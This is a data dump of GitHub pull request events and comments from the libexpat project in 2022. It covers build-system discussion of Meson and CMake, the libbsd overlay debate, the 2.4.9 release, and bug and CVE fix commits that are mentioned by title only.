Most uses of cmakedefine are a simple matter of `#cmakedefine FOO ""@FOO@""` -- Meson does work for these cases, for the more complex cases the solution is the same as most build system differences -- handle it yourself. It's usually easier to use a common format than to go chasing edge cases (which isn't to say no one will chase those edge cases, but -ENOTIME...)

In the case of expat, this does not actually matter for Meson because Meson's (~~evil toxic influence on the software ecosystem~~) wrapped version of expat simply does not use the cmake input file -- maybe for this exact reason. Instead it uses https://mesonbuild.com/Configuration.html#configuring-without-an-input-file, directly serializing a configuration_data holder with typed values.

However, https://github.com/mesonbuild/wrapdb/pull/594 proposes to switch that to using the cmake input file instead. It's a nice idea in theory, simply because Meson can then **emit a warning if there are replacement tokens that weren't provided**. On the other hand, the current Meson definitions don't include useless defines that expat doesn't use in the first place, and switching to the cmake input file would bloat that up. Meson also adds a free `#pragma once` that would now disappear -- some would argue that is a good thing since it's nonstandard and only ""widely"" rather than ""universally"" supported, and hence triggers warnings on the remainder of compilers. :shrug:","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1229373968"", ""author_association"": ""NONE""}"
636,IssueComment,2022-08-28 04:38:08,eli-schwartz,fork_merge,"Actually I wonder why this is ifdef'ed in the cmake header at all.

It's already handled correctly in lib/xmlparse.c:

```c
#  if ! defined(_WIN32) && defined(XML_DEV_URANDOM)
```

in both locations where it's relevant.

The autootols build doesn't check which OS you configure on before defining XML_DEV_URANDOM, so it's important (and easy) to check in xmlparse.c otherwise building on MinGW systems via autotools would produce incorrect results.

The only reason the configured header does indented cmakedefines is because it tries to check that again. And then CMakeLists.txt itself checks it a *third* time.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1229374504"", ""author_association"": ""NONE""}"
636,Labeled,2022-08-28 13:26:19,hartwork,fork_merge,enhancement,
636,Labeled,2022-08-28 13:26:19,hartwork,fork_merge,compilation,
636,MergePR,2022-08-28 13:26:30,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7273487591"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9d246a722576be37d6880a63782dab30132d423e""}"
636,DeleteBranch,2022-08-28 19:27:09,neheb,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7273899201"", ""commit_url"": null}"
636,Referenced,2022-09-15 15:05:01,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915781"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
636,Referenced,2022-09-19 14:22:46,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155058"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
637,SubmitCommit,2022-08-27 22:57:42,neheb,fork_merge,"apply-clang-format: add support for BSD find

Found with shellcheck:

SC2185: Some finds don't have a default path. Specify '.' explicitly.

Signed-off-by: Rosen Penev <rosenp@gmail.com>","{""sha"": ""cf0072d274064a2f2682574655c3af272f2c3370"", ""author"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-08-27T22:57:42Z""}, ""committer"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-08-27T22:57:42Z""}}"
637,OpenPR,2022-08-27 22:59:15,neheb,fork_merge,,
637,ReviewApproved,2022-08-27 23:00:25,hartwork,fork_merge,Thanks! :+1: ,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/637#pullrequestreview-1087780449""}"
637,RenameTitle,2022-08-27 23:00:53,hartwork,fork_merge,,"{""rename"": {""from"": ""apply-clang-format: add support for BSD find"", ""to"": ""apply-clang-format.sh: Add support for BSD find""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272617467""}"
637,MergePR,2022-08-28 13:21:17,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7273481981"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/fa9f063fe4f90067212b73f0ca00fe7ba80b2769""}"
637,DeleteBranch,2022-08-28 19:26:55,neheb,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7273898983"", ""commit_url"": null}"
637,Referenced,2022-09-15 15:05:01,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915788"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
637,Referenced,2022-09-19 14:22:46,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155069"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
638,SubmitCommit,2022-08-27 23:38:43,hartwork,unfork_merge,fix-xmltest-log.sh: Drop more Wine bug output,"{""sha"": ""05e904118fb0635378d6330edc979788a92258f4"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-20T14:49:53Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-27T23:38:43Z""}}"
638,OpenPR,2022-08-27 23:39:40,hartwork,unfork_merge,,
638,CrossReferenced,2022-08-27 23:42:34,hartwork,unfork_merge,CMake: Drop leading whitespace from a #cmakedefine line in file expat_config.h.cmake to workaround issues with Meson,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/636"", ""is_pull_request"": true}}"
638,MergePR,2022-08-28 13:20:51,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7273481450"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/acf35f3f7c083212396e23e7fd7b91e27f2b934f""}"
638,DeleteBranch,2022-09-01 14:41:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7305964345"", ""commit_url"": null}"
639,OpenPR,2022-08-30 22:57:29,neheb,fork_close,,
639,HeadRefForcePushed,2022-08-30 23:06:18,neheb,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7291542679"", ""commit_url"": null}"
639,HeadRefForcePushed,2022-08-30 23:08:16,neheb,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7291550541"", ""commit_url"": null}"
639,IssueComment,2022-08-30 23:09:47,neheb,fork_close,"```
 @@ -7,7 +7,7 @@
 HAVE_GETPAGESIZE
 HAVE_GETRANDOM
 HAVE_INTTYPES_H
-HAVE_LIBBSD
+HAVE_LIBBSD_OVERLAY
 HAVE_MEMORY_H
 HAVE_MMAP
 HAVE_STDINT_H
```

great...","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1232261866"", ""author_association"": ""CONTRIBUTOR""}"
639,ReviewComment,2022-09-01 14:15:18,hartwork,fork_close,"@neheb I'm unsure if this is worth fixing. Is this PR motivated by a general drive for clean-up or something more specific? Best, Sebastian","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/639#pullrequestreview-1093479374""}"
639,IssueComment,2022-09-01 19:21:04,neheb,fork_close,Yeah. It's simpler to use the overlay.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1234687506"", ""author_association"": ""CONTRIBUTOR""}"
639,IssueComment,2022-09-01 19:51:24,hartwork,fork_close,"> Yeah. It's simpler to use the overlay.

@neheb I'm not sure I understand. Are you pro adjustment or pro sticking to status quo on `master`?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1234712864"", ""author_association"": ""MEMBER""}"
639,Revise,2022-09-01 21:05:58,neheb,fork_close,"expat: switch to libbsd-overlay

Simplifies code as special bsd/ headers are not needed.

Signed-off-by: Rosen Penev <rosenp@gmail.com>","{""sha"": ""27e633a0d7bade4d980f0063dcabd542819fcf68"", ""author"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-08-30T22:56:23Z""}, ""committer"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-09-01T21:05:58Z""}}"
639,HeadRefForcePushed,2022-09-01 21:06:09,neheb,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7308660705"", ""commit_url"": null}"
639,IssueComment,2022-09-01 21:06:37,neheb,fork_close,It's preferable to use the overlay. See https://gitlab.freedesktop.org/libbsd/libbsd/-/issues/11,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1234783116"", ""author_association"": ""CONTRIBUTOR""}"
639,IssueComment,2022-09-01 21:26:53,hartwork,fork_close,"> It's preferable to use the overlay. See https://gitlab.freedesktop.org/libbsd/libbsd/-/issues/11

I don't see any strong arguments in there that would apply to Expat.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1234801173"", ""author_association"": ""MEMBER""}"
639,IssueComment,2022-09-01 21:31:27,hartwork,fork_close,"@neheb … and libbsd upstream has not taken any action yet, with regard to that reference. 

Note that with regard to the current PR content the `set(HAVE_LIBBSD TRUE)` in CMake will also need adjustment.

I'm not sure if Expat's Autotools build system fully forwards `-DLIBBSD_OVERLAY` in its current state, so that would need verification.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1234804431"", ""author_association"": ""MEMBER""}"
639,IssueComment,2022-09-08 10:35:33,hartwork,fork_close,@neheb how would you like us to proceed?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1240535360"", ""author_association"": ""MEMBER""}"
639,IssueComment,2022-09-09 04:52:44,neheb,fork_close,"Not sure really. Maybe just get rid of libbsd entirely.

Latest glibc will have an implementation of arc4random. And if older glibc is used, that's just a wrapper over get random, which expat already supports.

","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1241497289"", ""author_association"": ""CONTRIBUTOR""}"
639,IssueCommentSupplement,2022-09-11 14:23:57,hartwork,fork_close,"> Not sure really. Maybe just get rid of libbsd entirely.
> 
> Latest glibc will have an implementation of arc4random. And if older glibc is used, that's just a wrapper over get random, which expat already supports.

@neheb libbsd is currently used in Linux-based coverage collection CI and addition of arc4random to glibc 2.36 is only a few weeks old so it will take time to arrive in distributions that are not on the most bleeding edge. I would like to pull the ""not a problem before it's a problem"" card on use of libbsd here. With that in mind and the failing CI I'll close the PR for the moment.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1242976132"", ""author_association"": ""MEMBER""}"
639,ClosePR,2022-09-11 14:23:57,hartwork,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7362486104"", ""commit_url"": null}"
640,Labeled,2022-09-11 18:58:50,hartwork,unfork_merge,security,
640,OpenPR,2022-09-11 18:58:50,hartwork,unfork_merge,,
640,HeadRefForcePushed,2022-09-11 19:02:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7362812026"", ""commit_url"": null}"
640,HeadRefForcePushed,2022-09-11 21:23:07,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7362962999"", ""commit_url"": null}"
640,Revise,2022-09-14 16:57:51,hartwork,unfork_merge,tests: Cover heap use-after-free issue in doContent,"{""sha"": ""a7ce80a013f2a08cb1ac4aac368f2250eea03ebf"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-11T17:34:33Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-14T16:57:51Z""}}"
640,Revise,2022-09-14 16:59:03,hartwork,unfork_merge,Changes: Document heap use-after-free CVE-2022-40674,"{""sha"": ""721169eeca509ba93be6c73d0abe1caf5d218b9c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-11T18:38:09Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-14T16:59:03Z""}}"
640,HeadRefForcePushed,2022-09-14 16:59:50,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7387817263"", ""commit_url"": null}"
640,RenameTitle,2022-09-14 17:00:15,hartwork,unfork_merge,,"{""rename"": {""from"": ""tests: Cover heap use-after-free issue in doContent (follow-up to #629)"", ""to"": ""[CVE-2022-40674] tests: Cover heap use-after-free issue in doContent (follow-up to #629)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7387820211""}"
640,Labeled,2022-09-14 17:01:25,hartwork,unfork_merge,bug,
640,MergePR,2022-09-14 17:56:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7388276154"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/a976e32abd257728a51dc55cf3d4ebee5b853459""}"
640,DeleteBranch,2022-09-14 23:05:15,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7390104555"", ""commit_url"": null}"
640,Referenced,2022-09-21 11:46:56,algitbot,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7430138785"", ""commit_url"": ""https://api.github.com/repos/alpinelinux/aports/commits/06aa1d81177d00a95baa5e61fd13b0bee0955647""}"
640,CrossReferenced,2022-10-11 11:29:38,CamberLoid,unfork_merge,"expat: Multiple vulnerabilites (CVE-2022-40674, CVE-2022-43680)","{""reference"": {""url"": ""https://api.github.com/repos/AOSC-Dev/aosc-os-abbs/issues/4244"", ""is_pull_request"": false}}"
640,CrossReferenced,2022-10-11 20:53:57,cbmarcum,unfork_merge,fix: use-after-free issue in doContent,"{""reference"": {""url"": ""https://api.github.com/repos/cbmarcum/libexpat/issues/4"", ""is_pull_request"": true}}"
640,CrossReferenced,2022-10-14 06:52:21,RoninBreizh,unfork_merge,Incorrect Severity ranking for the same image using trivy in CLI compare to the use of trivy.dev tool,"{""reference"": {""url"": ""https://api.github.com/repos/aquasecurity/trivy/issues/3020"", ""is_pull_request"": false}}"
641,SubmitCommit,2022-09-12 15:07:14,hartwork,unfork_merge,Stop exporting API symbols when building a static library,"{""sha"": ""107437adcd6af7611606e2260254fcc4feaef84a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-12T15:04:45Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-12T15:07:14Z""}}"
641,Labeled,2022-09-12 15:19:45,hartwork,unfork_merge,enhancement,
641,Labeled,2022-09-12 15:19:45,hartwork,unfork_merge,compilation,
641,OpenPR,2022-09-12 15:19:45,hartwork,unfork_merge,,
641,CrossReferenced,2022-09-12 15:21:34,hartwork,unfork_merge,give option to set XML_SYMBOL_VISIBILITY=0 when building static library with CMake,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/626"", ""is_pull_request"": false}}"
641,MergePR,2022-09-12 16:19:10,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7369142635"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/a48c40700094e119b0a99121aa90d6810b095d6a""}"
641,DeleteBranch,2022-09-12 16:52:45,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7369414214"", ""commit_url"": null}"
643,SubmitCommit,2022-09-14 23:12:37,hartwork,unfork_merge,"tests: Address Clang 15 warning -Wstrict-prototypes

Symptom was:
error: a function declaration without a prototype is deprecated in all versions of C [-Werror,-Wstrict-prototypes]","{""sha"": ""d88c9510e2a529285435e4196ae4f5c3b1d390f9"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-14T23:00:43Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-14T23:12:37Z""}}"
643,SubmitCommit,2022-09-14 23:12:37,hartwork,unfork_merge,Actions: Upgrade Clang from 14 to 15,"{""sha"": ""d139637bcb99401d20b03898271e3917b0d413b7"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-14T22:52:18Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-14T23:12:37Z""}}"
643,Labeled,2022-09-14 23:13:44,hartwork,unfork_merge,enhancement,
643,Labeled,2022-09-14 23:13:44,hartwork,unfork_merge,compilation,
643,OpenPR,2022-09-14 23:13:44,hartwork,unfork_merge,,
643,MergePR,2022-09-15 13:46:42,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395180504"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/be3202513bf304c8f628b6728d86af82ceb59fb3""}"
643,DeleteBranch,2022-09-15 13:49:29,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395205880"", ""commit_url"": null}"
644,Labeled,2022-09-15 15:08:20,hartwork,unfork_merge,releasing,
644,OpenPR,2022-09-15 15:08:20,hartwork,unfork_merge,,
644,Labeled,2022-09-15 15:23:24,hartwork,unfork_merge,security,
644,HeadRefForcePushed,2022-09-15 21:32:25,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7398479621"", ""commit_url"": null}"
644,Revise,2022-09-19 14:19:42,hartwork,unfork_merge,win32/build_expat_iss.bat: Add -DEXPAT_WARNINGS_AS_ERRORS=ON,"{""sha"": ""7430d287693592bf06d16dbb293466150114ed16"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-21T15:31:27Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-19T14:19:42Z""}}"
644,Revise,2022-09-19 14:19:42,hartwork,unfork_merge,"Resolve use of deprecated ""fgrep"" by ""grep -F""

Related:
https://lists.gnu.org/archive/html/info-gnu/2022-09/msg00001.html","{""sha"": ""86a4093aabe398a3d25aa775408592e63c29b204"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-15T13:55:55Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-19T14:19:42Z""}}"
644,Revise,2022-09-19 14:20:44,hartwork,unfork_merge,Bump version to 2.4.9,"{""sha"": ""a7103d40d87e9deec49f3eb0c186a683a8921574"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-15T13:57:59Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-19T14:20:44Z""}}"
644,Revise,2022-09-19 14:20:44,hartwork,unfork_merge,Set release date for version 2.4.9,"{""sha"": ""869b3dea1cdc7c99e0302e9ba8145ea9fcd29489"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-15T14:03:31Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-19T14:20:44Z""}}"
644,Revise,2022-09-19 14:20:44,hartwork,unfork_merge,Changes: Document #592 #593 #594 #614 #619 #627 #633 #635 #636 #637,"{""sha"": ""f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-15T14:58:33Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-19T14:20:44Z""}}"
644,Revise,2022-09-19 14:20:44,hartwork,unfork_merge,Sync file headers,"{""sha"": ""55b79f4d8816568a9a3a66b3619c54b794fcf2a7"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-15T14:06:35Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-19T14:20:44Z""}}"
644,Revise,2022-09-19 14:20:44,hartwork,unfork_merge,"Bump version info from 9:8:8 to 9:9:8

See https://verbump.de/ for what these numbers do","{""sha"": ""88462ba0fa9d5e817996a32a800cbd448d6427e0"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-15T14:12:09Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-19T14:20:44Z""}}"
644,HeadRefForcePushed,2022-09-19 14:22:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155052"", ""commit_url"": null}"
644,IssueComment,2022-09-19 16:01:20,shak5009,unfork_merge,Thanks for all the efforts on releasing 2.4.9. Is there an estimated date for the R_2_4_9?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1251221784"", ""author_association"": ""NONE""}"
644,IssueComment,2022-09-19 16:09:49,hartwork,unfork_merge,"@shak5009 I'm expecting just a few days more, maximum.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1251231877"", ""author_association"": ""MEMBER""}"
644,MergePR,2022-09-20 14:26:19,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7422859740"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/d77291a4824d78e697c5dc2b8024fd65ab31e209""}"
644,Assigned,2022-09-20 14:26:26,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
644,DeleteBranch,2022-09-20 14:27:04,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7422867496"", ""commit_url"": null}"
644,IssueCommentSupplement,2022-09-20 16:48:53,hartwork,unfork_merge,@shak5009 FYI Expat 2.4.9 has been released earlier today.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1252629442"", ""author_association"": ""MEMBER""}"
644,IssueCommentSupplement,2022-09-20 20:35:06,shak5009,unfork_merge,"> 

Thanks a lot. Really appreciate the efforts.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1252883037"", ""author_association"": ""NONE""}"
645,Labeled,2022-09-15 21:15:55,hartwork,unfork_merge,bug,
645,OpenPR,2022-09-15 21:15:55,hartwork,unfork_merge,,
645,CrossReferenced,2022-09-15 21:29:20,hartwork,unfork_merge,unfinished m_declAttributeType allocation in ->m_tempPool can corrupt following allocation,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/612"", ""is_pull_request"": false}}"
645,Referenced,2022-09-20 14:31:51,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7422914446"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/1590812d9243827ca4c497d031fcf3f2282bb820""}"
645,HeadRefForcePushed,2022-09-20 14:31:51,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7422914488"", ""commit_url"": null}"
645,CrossReferenced,2022-09-20 14:43:04,hartwork,unfork_merge,Clear m_tempPool when skipping entities (fixes #612),"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/615"", ""is_pull_request"": true}}"
645,Revise,2022-09-20 22:27:33,RMJ10,unfork_merge,"Regression test for #612: tempPool corrupt from attribute types.

Attribute type declarations accumulate the type in m_tempPool.
When parsing is skipped because of (for example) a missing
parameter entity, the accumulated definition is not cleared out
as it normally would be, and corrupts the data passed to future
handlers.

Note this commit leaves the regression tests failing (which is
after all what we were trying to prove).","{""sha"": ""c697c3ed6e70656765a34be973aebf36f3260224"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T13:52:14Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-20T22:27:33Z""}}"
645,Revise,2022-09-20 22:27:33,thejh,unfork_merge,Fix curruption from undefined entities (fixes #612),"{""sha"": ""1bdbde26b96ac3e03424d3f9ed4ae1bfb09e5c02"", ""author"": {""name"": ""Jann Horn"", ""email"": ""jannh@google.com"", ""date"": ""2022-09-15T21:03:42Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-20T22:27:33Z""}}"
645,Revise,2022-09-20 22:27:57,hartwork,unfork_merge,Changes: Document #612 #645,"{""sha"": ""fa1efbac978d71fe703c67fc556d8d6108d9f036"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-15T21:10:43Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-20T22:27:57Z""}}"
645,HeadRefForcePushed,2022-09-20 22:28:40,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7426057892"", ""commit_url"": null}"
645,MergePR,2022-10-07 17:05:30,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7545220749"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/eb976a36d0150402620e498420c9491422565fc1""}"
645,DeleteBranch,2022-10-07 17:28:06,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7545348256"", ""commit_url"": null}"
648,SubmitCommit,2022-09-20 21:19:14,hartwork,unfork_merge,"tests: Address GCC warning -Wmissing-prototypes

Symptom:
../../../tests/runtests.c:4994:1: warning: no previous prototype for ‘suspending_comment_handler’ [-Wmissing-prototypes]
 4994 | suspending_comment_handler(void *userData, const XML_Char *data) {
      | ^~~~~~~~~~~~~~~~~~~~~~~~~~","{""sha"": ""9f13b5b57532307d80223ae021b79fe24b649d31"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-20T21:17:08Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-20T21:19:14Z""}}"
648,Labeled,2022-09-20 21:21:46,hartwork,unfork_merge,enhancement,
648,Labeled,2022-09-20 21:21:46,hartwork,unfork_merge,compilation,
648,OpenPR,2022-09-20 21:21:46,hartwork,unfork_merge,,
648,MergePR,2022-09-20 22:26:19,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7426049020"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/b4eecc131ff133e938a875a7263af73b75eb7bfc""}"
648,DeleteBranch,2022-09-20 22:26:32,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7426049825"", ""commit_url"": null}"
650,Labeled,2022-09-21 01:40:08,hartwork,unfork_merge,bug,
650,OpenPR,2022-09-21 01:40:08,hartwork,unfork_merge,,
650,RenameTitle,2022-09-21 01:42:32,hartwork,unfork_merge,,"{""rename"": {""from"": ""Fix overeager DTD destruction (fixes #649)"", ""to"": ""[W.I.P.] Fix overeager DTD destruction (fixes #649)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7426728056""}"
650,HeadRefForcePushed,2022-09-21 01:55:33,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7426770370"", ""commit_url"": null}"
650,RenameTitle,2022-09-21 01:55:42,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] Fix overeager DTD destruction (fixes #649)"", ""to"": ""Fix overeager DTD destruction (fixes #649)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7426770940""}"
650,CrossReferenced,2022-09-21 02:11:55,hartwork,unfork_merge,Bugfixes,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/616"", ""is_pull_request"": true}}"
650,HeadRefForcePushed,2022-10-07 17:30:11,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7545359504"", ""commit_url"": null}"
650,IssueComment,2022-10-07 17:51:22,hartwork,unfork_merge,Related: https://github.com/libexpat/libexpat/pull/616#discussion_r990257381,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1271878934"", ""author_association"": ""MEMBER""}"
650,Labeled,2022-10-07 17:51:58,hartwork,unfork_merge,security,
